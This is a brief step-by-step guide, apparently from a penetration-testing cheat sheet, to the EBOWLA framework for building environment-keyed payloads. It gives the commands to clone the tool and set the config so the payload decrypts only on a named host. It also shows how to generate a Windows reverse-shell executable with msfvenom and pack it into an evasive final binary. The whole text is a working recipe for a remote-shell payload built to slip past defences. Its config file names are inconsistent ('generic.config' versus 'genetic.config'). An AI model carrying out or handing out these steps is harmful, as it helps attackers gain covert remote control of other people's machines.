# EBOWLA
## framework for building environmental keyed payloads

### Get EBOWLA

```git clone https://github.com/Genetic-Malware/Ebowla```

```cd Ebowla```

### edit generic.config:

change:

output_type = GO

payload_type = EXE

Set at least one environment variable (computername = hostname),
the name has to be exact, as Ebowla won't decrypt otherwise.

### make payload

Make, as an example, a reverse shell payload with metersploit: 

```msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -a x64 -o shell.exe```

### build executable with Ebowla

```python2 ebowla.py shell.exe genetic.config```

```./build_x64_go.sh output/<outputfilefromfirststeps> <finalfilename>```

The finished, packed executable can be found in the **output** folder.
